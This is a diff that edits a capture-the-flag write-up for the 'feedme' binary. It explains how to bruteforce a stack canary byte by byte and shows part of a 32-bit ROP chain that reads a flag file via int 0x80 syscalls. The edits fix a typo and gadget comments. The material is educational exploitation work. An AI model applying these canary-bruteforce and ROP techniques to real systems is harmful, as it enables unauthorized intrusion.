@@ -6,7 +6,7 @@ $ file feedme
 feedme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped
 ```
 
-and with `checksec` we see that NX is enabled and debugging a little bit we realize that the usage of the binary is simple: a "parent" process launches child processes that takes 1 byte `x`, than reads `x` number of bytes. But the length of the buffer is 32, so if we send "\x36" + "A"*0x36 the canary is overwritten and smash the stack detected. 
+and with `checksec` we see that NX is enabled and debugging a little bit we realize that the usage of the binary is simple: a "parent" process launches child processes that takes 1 byte `x`, then reads `x` number of bytes. But the length of the buffer is 32, so if we send "\x36" + "A"*0x36 the canary is overwritten and smash the stack detected. 
 
 So we have to leak the canary in order to overwrite the return address. The bug was that child's canary is always the same, so we can try to send 0x32 bytes of garbage and bruteforce the 33th byte (easy, always `\x00`), then the 34th, then the 35th and 36th one.
 
@@ -74,7 +74,7 @@ p += p32(0x0806f370)  #pop edx pop ecx pop ebx
 p += p32(0x5)#flag\x00
 p += p32(0x080eaf80)#BSS address
 p += p32(0x0)
-p += p32(0x0806FA20) #int 80
+p += p32(0x0806FA20) #int 80; ret
 
 
 p += p32(0x080bb496) #pop eax
@@ -83,7 +83,7 @@ p += p32(0x0806f370)  #pop edx pop ecx pop ebx
 p += p32(0x0)
 p += p32(0x0)
 p += p32(0x080eaf80) #address of flag string
-p += p32(0x0806FA20) #int 80
+p += p32(0x0806FA20) #int 80; ret
 
 p += p32(0x080bb496) #pop eax
 p += p32(0x3) #read sys
@@ -91,7 +91,7 @@ p += p32(0x0806f370)  #pop edx pop ecx pop ebx
 p += p32(0x100) #length
 p += p32(0x080ea060) #.data address
 p += p32(0x2) #FD
-p += p32(0x0806FA20) #int 80
+p += p32(0x0806FA20) #int 80; ret
 
 p += p32(0x080bb496) #pop eax
 p += p32(0x4) #write sys
@@ -99,7 +99,7 @@ p += p32(0x0806f370)  #pop edx pop ecx pop ebx
 p += p32(0x100) #length
 p += p32(0x080ea060)#address
 p += p32(0x01) #FD
-p += p32(0x0806FA20) #int 80
+p += p32(0x0806FA20) #int 80; ret
 ``` 
 
 PWN THEM!!
